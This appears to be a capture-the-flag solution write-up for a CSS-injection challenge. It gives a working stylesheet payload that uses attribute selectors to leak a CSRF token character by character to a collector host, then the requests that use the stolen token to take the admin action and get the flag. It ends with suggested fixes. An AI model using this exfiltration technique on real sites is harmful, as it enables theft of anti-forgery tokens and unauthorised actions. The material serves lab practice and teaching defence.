Full chain. Leak the 8-hex token one character per round, then use it.

For position `N` (with the characters you already know as `PREFIX`), `POST /styles`
a stylesheet of 16 rules:

```css
input[name='csrf'][value^='PREFIX0'] {
  background: url('http://collector:9000/report?p=N&c=0');
}
input[name='csrf'][value^='PREFIX1'] {
  background: url('http://collector:9000/report?p=N&c=1');
}
/* … through f … */
```

The admin bot previews it (the stylesheet is `no-store`, so each round's rules
apply); the one matching rule beacons that character. Read `GET /oob/received`, find
the item tagged `p=N`, take its `c=` value, append it to `PREFIX`, and repeat for
`N = 0..7`.

With the full token, complete the chain:

```
POST /admin/action   Content-Type: application/json   {"csrf":"<8-hex token>"}   → 200
POST /solve                                                                       → FLAG{…}
```

`tests/exploit.py` automates all of it, and first asserts the integrity properties:
`/preview` is 403 for you, its CSP is `script-src 'none'` (so CSS is the only
exfil), and `/admin/action` rejects a wrong token (so you really must leak the real
one). Fixes: don't render untrusted CSS beside secrets, keep the token out of a DOM
attribute, and rotate it per request.
